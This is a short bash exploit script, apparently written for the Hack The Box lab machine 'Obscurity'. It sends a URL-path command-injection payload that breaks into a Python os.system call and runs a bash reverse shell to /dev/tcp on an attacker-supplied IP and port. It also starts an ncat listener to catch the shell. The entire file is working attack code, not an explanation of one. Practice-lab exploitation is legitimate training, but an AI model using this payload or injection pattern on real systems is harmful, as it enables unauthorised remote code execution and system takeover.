#!/bin/bash

#Dependencies: rxvt, rlwrap
#Do: apt install rxvt, rlwrap

help_menu() {
echo -e "\e[35m###########################################"
echo -e "\e[35m# Exploit for HTB Obscurity -> get user ! #"
echo -e "\e[35m###########################################"
echo -e "\e[35m#                 @Kr0ff                  #"
echo -e "\e[35m#_________________________________________#"
echo
echo -e "\e[97mUsage:"
echo
echo -e "\e[97m./exploit.sh <Target IP/Hostname> <Target Port> <Attacker IP> <Attacker Port>"
echo
echo
echo -e "\e[33mComment: Enable proxy variable to send the requests to Burp"
echo
}

proxy="http://127.0.0.1:8080" #--proxy flag for curl

url=${1}
url_port=${2}
attacker_ip=${3}
attacker_port=${4}

s="'"
s2='"'
payload="$s;os.system("$s"bash%20-c%20"$s2"bash%20-i%20>&%20/dev/tcp/$attacker_ip/$attacker_port%200>&1"$s2"$s);$s"

function connect_t {
    echo -e "\e[32m[+] Connection will be established...."
    echo -e "\e[32m[+] Shell should be received soon...."
    echo
    echo -e "\e[32m[*] Don't forget to get a PTY shell, if you can !"
    echo
    urxvt -e rlwrap ncat -lnvp $attacker_port &
    sleep 1
    curl --user-agent  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0" "http://"$url":"$url_port"/"$payload &

}


if ! [[ $# -eq 0 ]]
then
    connect_t
else
    help_menu
    exit 0
fi

